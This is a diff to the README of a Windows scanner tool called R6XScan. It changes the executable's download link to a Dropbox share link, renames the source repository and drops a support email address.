@@ -105,7 +105,7 @@ Join our Discord server and use `/generate_key YOUR_USER_ID` to get a key:
 ```
 
 ### Step 2: Download the Scanner
-[⬇️ Download R6XScan.exe](https://pcchekerb.onrender.com/download-exe)
+[⬇️ Download R6XScan.exe](https://www.dropbox.com/scl/fi/monrwstbsvm5yt3f4cob0/R6XScan.exe?rlkey=33povief4dlpqvqcf7v85huzg&st=tjpfe2ef&dl=0)
 
 ### Step 3: Run and Login
 ```bash
@@ -125,8 +125,8 @@ Join our Discord server and use `/generate_key YOUR_USER_ID` to get a key:
 | **Python Source** | `scanner.py` | ~150KB | Windows (with Python) |
 
 ### Direct Links
-- [⬇️ Download R6XScan.exe](https://pcchekerb.onrender.com/download-exe)
-- [⬇️ View Source Code](https://github.com/xotiic4201/R6X-CYBERSCAN)
+- [⬇️ Download R6XScan.exe](https://www.dropbox.com/scl/fi/monrwstbsvm5yt3f4cob0/R6XScan.exe?rlkey=33povief4dlpqvqcf7v85huzg&st=tjpfe2ef&dl=0)
+- [⬇️ View Source Code](https://github.com/xotiic4201/R6X-Scan)
 
 ---
 
@@ -314,9 +314,8 @@ Scan ID: R6X-20240315-143022-345678
 
 ## 📞 Support
 
-- **GitHub Issues**: [Report bugs](https://github.com/xotiic4201/R6X-CYBERSCAN/issues)
+- **GitHub Issues**: [Report bugs](https://github.com/xotiic4201/R6X-Scan/issues)
 - **Discord**: [Join our server](https://discord.gg/SVvZFnct37)
-- **Email**: support@r6x-cyberscan.com
 
 ---
 
